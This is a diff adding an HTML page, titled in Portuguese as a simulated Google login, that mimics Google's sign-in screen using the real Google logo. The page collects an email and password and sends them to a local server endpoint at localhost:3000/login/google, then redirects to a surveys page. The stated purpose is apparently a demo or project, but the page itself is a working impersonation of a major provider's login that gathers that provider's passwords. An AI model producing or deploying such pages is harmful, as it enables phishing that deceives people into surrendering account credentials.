@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Google - Simulado</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Roboto", sans-serif;
+    }
+    body {
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 360px;
+      padding: 24px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 90px;
+    }
+    h2 {
+      font-size: 20px;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 10px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+    }
+    input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 1px #1a73e8;
+    }
+    .link {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+    .link a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .btn {
+      padding: 10px 16px;
+      border: none;
+      border-radius: 4px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .btn-outline {
+      background: none;
+      color: #1a73e8;
+    }
+    .btn-primary {
+      background-color: #1a73e8;
+      color: white;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" />
+    </div>
+
+    <h2>Fazer login</h2>
+    <p>Use sua Conta</p>
+    <input type="email" id="email" placeholder="E-mail ou telefone" />
+    <input type="password" id="password" placeholder="Sua senha" /> 
+    <div class="link">
+      <a href="#">Esqueceu o e-mail?</a>
+    </div>
+
+    <div class="buttons">
+      <button class="btn btn-primary" onclick="login()">Avançar</button>
+    </div>
+  </div>
+
+  <script>
+    function login() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+  
+      if (!email || !password) {
+        alert('Preencha e-mail e senha.');
+        return;
+      }
+  
+      fetch('http://localhost:3000/login/google', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      })
+      .then(async response => {
+        const data = await response.json();
+  
+        if (data.success) {
+          window.location.href = "pesquisas.html";
+        } else {
+          throw new Error(data.error || 'Falha no cadastro');
+        }
+      })
+      .catch(err => {
+        alert(err.message);
+        console.error(err);
+      });
+    }
+  </script>
+  
+</body>
+</html>
